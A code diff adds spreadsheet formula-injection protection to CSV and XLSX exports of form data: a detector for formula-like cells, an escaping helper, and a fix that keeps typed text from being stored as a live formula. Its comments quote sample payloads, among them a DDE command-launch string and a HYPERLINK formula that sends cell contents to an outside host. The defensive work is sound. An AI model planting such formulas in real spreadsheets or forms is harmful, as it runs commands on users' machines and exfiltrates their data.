@@ -21,6 +21,7 @@ from __future__ import annotations
 
 import csv
 import io
+import re
 from collections.abc import Callable, Iterable
 from dataclasses import dataclass, field
 from datetime import date, datetime
@@ -112,6 +113,33 @@ def infer_fmt(col: Col, value) -> str:
     return "text"
 
 
+# A cell Excel would run as a formula: «=», «@», a tab or CR first, or a sign
+# followed by more than a number or a phone («+52 55 1234 5678» stays as is;
+# «-2+3+cmd|' /C calc'!A0» and «+HYPERLINK(…)» do not).
+_FORMULA_START = ("=", "@", "\t", "\r")
+_SIGNED_NUMBER = re.compile(r"^[+-][\d\s.,()/-]*$")
+
+
+def looks_like_formula(text: str) -> bool:
+    if not text:
+        return False
+    if text.startswith(_FORMULA_START):
+        return True
+    return text[0] in "+-" and not _SIGNED_NUMBER.match(text)
+
+
+def csv_safe(value):
+    """A CSV cell Excel shows as text: what reads as a formula gets a leading «'».
+
+    Names, notes and messages come from public forms (pre-registro, contacto,
+    visitas): «=HYPERLINK("https://x/?"&B2,"Ver")» in a name would otherwise
+    run in the office's spreadsheet and send the neighbouring cells away.
+    """
+    if isinstance(value, str) and looks_like_formula(value):
+        return "'" + value
+    return value
+
+
 def text_value(col: Col, value, *, human: bool = False) -> str:
     """CSV (``human=False``: ISO-ish, Excel-parseable) or PDF (``human=True``: DD/MM/YYYY)."""
     if value is None or value == "":
@@ -171,7 +199,7 @@ def render_csv(rows: Iterable, spec: ExportSpec) -> StreamingHttpResponse:
         yield "﻿"
         yield writer.writerow(spec.headers())
         for row in rows:
-            yield writer.writerow([text_value(c, c.value(row)) for c in spec.columns])
+            yield writer.writerow([csv_safe(text_value(c, c.value(row))) for c in spec.columns])
 
     response = StreamingHttpResponse(
         (chunk.encode("utf-8") for chunk in stream()), content_type=CONTENT_TYPES["csv"]
@@ -204,6 +232,10 @@ def xlsx_bytes(headers, rows, *, sheet_title="Datos", widths=None, cells=None) -
         out = []
         for value, number_format in (cells(row) if cells else [(v, None) for v in row]):
             cell = WriteOnlyCell(ws, value=value)
+            if isinstance(value, str) and cell.data_type == "f":
+                # openpyxl stores text starting with «=» as a live formula; the
+                # person typed text (a form, an import), so it stays text.
+                cell.data_type = "s"
             if number_format:
                 cell.number_format = number_format
             out.append(cell)
